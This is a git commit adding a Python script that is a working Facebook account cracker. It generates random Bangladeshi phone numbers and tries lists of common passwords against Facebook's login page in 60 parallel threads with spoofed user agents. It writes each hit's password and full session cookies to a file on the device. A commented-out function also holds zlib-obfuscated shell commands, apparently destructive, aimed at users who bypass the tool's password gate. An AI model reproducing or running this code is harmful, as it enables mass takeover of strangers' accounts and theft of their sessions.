c10da5f2d3a18d12a2a29a44ad37114190c2760d
Mahir082 <149363918+Mahir082@users.noreply.github.com>
2023-10-30 13:58:14 +0600

    Fb

---
+++ bal.py
@@ -0,0 +1,344 @@
+import os,time,sys
+os.system('clear')
+os.system('espeak -a 300 " join my facebook group"')
+print('{+}\033[1;33m𝑱𝑶𝑰𝑵 𝑴𝒀 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑮𝑹𝑶𝑼𝑷');time.sleep(2)
+os.system('xdg-open https://m.facebook.com/groups/657622865601150/?ref=share&mibextid=NSMWBT')
+os.system('espeak -a 300 " Team of Cyber one zero one"')
+from os import path
+import os,base64,zlib,pip,urllib
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+except:pass
+ok = []
+cp = []
+id = []
+session = requests.Session()
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+ugen=[]
+#Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M336K/KSU3AVI3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; Android  '
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' SAMSUNG SM-M336K/KSU3AVI3'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+warna1 = random.choice(my_color)
+warna2 = random.choice(my_color)
+warna3 = random.choice(my_color)
+warna4 = random.choice(my_color)
+warna5 = random.choice(my_color)
+warna6 = random.choice(my_color)
+gy = [YELLOW,GREEN]
+gyc = random.choice(gy)      
+logo=(f'''\x1b[1;92m>𝑼𝑷𝑫𝑨𝑻𝑬>𝑽>0.2
+\x1b[1;92m  ____    _    ____    _  _____ _   _  ____ 
+\x1b[1;93m / ___|  / \  |  _ \  | |/ /_ _| \ | |/ ___|
+\x1b[1;94m \___ \ / _ \ | | | | | ' / | ||  \| | |  _ 
+\x1b[1;95m  ___) / ___ \| |_| | | . \ | || |\  | |_| |
+\x1b[1;96m |____/_/   \_\____/  |_|\_\___|_| \_|\____|
+''')
+os.system('clear')
+print(logo)
+os.system('espeak -a 300 "ENTER USERNAME   "')
+CorrectUsername = 'SK'
+key = 'Taybul'
+while key == 'Taybul':
+    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92m𝑬𝑵𝑻𝑬𝑹 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬  \033[1;91m: \x1b[1;92m')
+    if username == CorrectUsername:
+            #print('\033[1;91m<═══\033[1;41m\033[1;97m 𝑻𝑬𝑨𝑴 𝑶𝑭 ??𝒀𝑩𝑬𝑹 101  \033[;0m\033[1;91m═══>\033[1;92m\n\033[0;97m[•]\033[1;32m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳') 
+            time.sleep(1)
+            key = 'false'
+os.system('espeak -a 300 "ENTER PASSWORD  "')
+CorrectPassword = 'SK'
+key = 'Taybulx'
+while key == 'Taybulx':
+    password = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92m𝑬𝑵𝑻𝑬𝑹 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫  \033[1;91m: \x1b[1;92m')
+    if password == CorrectPassword:
+            print('\033[1;91m<═══\033[1;41m\033[1;97m 𝑻𝑬𝑨𝑴 𝑶𝑭 𝑪𝒀𝑩𝑬𝑹 101  \033[;0m\033[1;91m═══>\033[1;92m\n\033[0;97m[•]\033[1;32m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳') 
+            time.sleep(1)
+            key = 'false'
+#os.system('git pull')
+#def fucked():
+	#print(' Server Loadin.......')
+#	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+#	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+#	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+#	print(' Fuck You Bypass User ');exit()            key = 'false'
+def TAYBUL():
+	os.system('clear')
+	print(logo)
+	print("\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92m1\x1b[1;97m]\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92mA\x1b[1;97m]\33[1;96m RANDOM CRACK (COOKIES SHOW)")
+	print("\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92m2\x1b[1;97m]\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92mB\x1b[1;97m]\33[1;95m RANDOM CRACK")
+	print(" \033[1;32m\x1b[1;92m\x1b[1;97m[\x1b[1;92m0\x1b[1;97m]\33[1;91m Exit")
+	TAYBUL =input("\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m Choose : ")
+	if TAYBUL in ["1","A"]:
+		king()
+	if TAYBUL in ["2","B"]:
+		cyber()
+	if TAYBUL in ["0","X"]:
+		exit()
+	else:
+		exit()
+def king():
+	os.system('clear')
+	print(logo)
+	print(">> \033[1;32mBD SIM CODE : \033[1;36m[\033[1;32m017\033[1;33m 018\033[1;34m 019 \033[1;35m013 \033[1;37m015\033[1;31m 016] ")
+	love = input('>> SELECT : ')
+	os.system('clear')
+	print(logo)
+	print('>>  \033[1;32mEXAMPLE : \033[1;36m[1000,5000,10000,15000,20000] ')
+	limit = int(input('>> LIMIT : '))
+	for nmbr in range(limit):
+		lova = ''.join(random.choice(string.digits) for _ in range(2))
+		lovb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with tred(max_workers=60) as taybul:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		#print(' \033[1;31m[(101)] \033[1;32mSIM CODE : '+love)
+		print(' \033[1;31m[?] \033[1;32mTOTAL ID :  '+tl)
+		#print(' \033[1;31m[(101)] \033[1;32mUSE FLIGHT MODE \033[1;37mON/\033[1;31mOFF')
+		print(f'\033[1;93m ⊰᯽⊱┈──╌──────╌──╌╌──╌───╌╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
+		for guru in user:
+			uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','bangla','jannat','alamin','i love you','free fire']
+			taybul.submit(test,uid,pwx,tl)
+	print(50*'━')
+	print(' <> CRACK DONE......... ')
+	print(50*'━')
+	exit()
+def cyber():
+	os.system('clear')
+	print(logo)
+	print(">> \033[1;32mBD SIM CODE : \033[1;36m[\033[1;32m017\033[1;33m 018\033[1;34m 019 \033[1;35m013 \033[1;37m015\033[1;31m 016] ")
+	love = input('>> SELECT : ')
+	os.system('clear')
+	print(logo)
+	print('>>  \033[1;32mEXAMPLE : \033[1;36m[1000,5000,10000,15000,20000] ')
+	limit = int(input('>> LIMIT : '))
+	for nmbr in range(limit):
+		lova = ''.join(random.choice(string.digits) for _ in range(2))
+		lovb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with tred(max_workers=60) as taybul:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		#print(' \033[1;31m[(101)] \033[1;32mSIM CODE : '+love)
+		print(' \033[1;31m[(101)] \033[1;32mCLONEING ID :  '+tl)
+		#print(' \033[1;31m[(101)] \033[1;32mUSE FLIGHT MODE \033[1;37mON/\033[1;31mOFF')
+		print(f'\033[1;93m ⊰᯽⊱┈──╌──────╌──╌╌──╌───╌╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
+		for guru in user:
+			uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','bangla','jannat','alamin','i love you','free fire','mababa','tanjila','taniya','sadiya','sumaiya']
+			taybul.submit(fuck,uid,pwx,tl)
+	print(50*'━')
+	print(' <> CRACK DONE......... ')
+	print(50*'━')
+	exit()
+def fuck(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            wa = random.choice(my_color)
+            sys.stdout.write('\r\33[1;90m [\33[1;96m\33[1;92mSK\33[1;90m]>[\33[1;92m%s\33[1;90m]>[\33[1;95m%s\33[1;90m]>\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+    'method': 'GET',
+    'path': '/login/device-based/login/async/',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=9vASZfytBCIOUVUJlOu9MF82; sb=9vASZSJ_e8hmjlQQ_iwVHQLR; m_pixel_ratio=2; wd=360x668; fr=0pfuUSm2NJjPlCiFX.AWXh3eG4IpBeOFIWhjunBy0K4xQ.BlFGjJ.A4.AAA.0.0.BlJZXk.AWUq_iXpWm4',
+    'dpr': '2',
+    'referer': 'https://p.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&search_attempts=2&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0&ref=dbl',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"CPH2421"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m[SK-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                print(f'\r \33[1;33m[NUMBER]  '+uid)
+                #print(f'\r \033[1;93m ⊰᯽⊱┈──╌──────╌──╌╌──╌───╌𝑻𝑨𝒀𝑩𝑼𝑳╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
+                oks.append(cid)
+                open('/sdcard/SKok.txt', 'a').write(cid+' | '+ps+' | '+uid+' >> '+coki+'\n')
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                #print(f"\r\33[1;91m[TAYBULCP] {uid} ¤ {ps}")
+               # open('/sdcard/TAYBULCP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+def test(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            wa = random.choice(my_color)
+            sys.stdout.write('\r\33[1;90m [\33[1;96m\33[1;92mSK\33[1;90m]>[\33[1;92m%s\33[1;90m]>[\33[1;95m%s\33[1;90m]>\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+    'method': 'GET',
+    'path': '/login/device-based/login/async/',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=9vASZfytBCIOUVUJlOu9MF82; sb=9vASZSJ_e8hmjlQQ_iwVHQLR; m_pixel_ratio=2; wd=360x668; fr=0pfuUSm2NJjPlCiFX.AWXh3eG4IpBeOFIWhjunBy0K4xQ.BlFGjJ.A4.AAA.0.0.BlJZXk.AWUq_iXpWm4',
+    'dpr': '2',
+    'referer': 'https://p.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&search_attempts=2&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0&ref=dbl',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"CPH2421"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m[SK-OK] '+cid+' ¤ '+ps+'\n[🔪👉] >>\033[1;36m '+coki+'\33[0;92m')
+                #print(f'\r \n\033[1;93m ⊰᯽⊱┈──╌──────╌──╌╌──╌───╌𝑻𝑨𝒀𝑩𝑼𝑳╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
+                oks.append(cid)
+                open('/sdcard/SKok.txt', 'a').write(cid+' | '+ps+' | '+uid+' >> '+coki+'\n')
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                #print(f"\r\33[1;91m[TAYBULCP] {uid} ¤ {ps}")
+               # open('/sdcard/TAYBULCP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+TAYBUL()
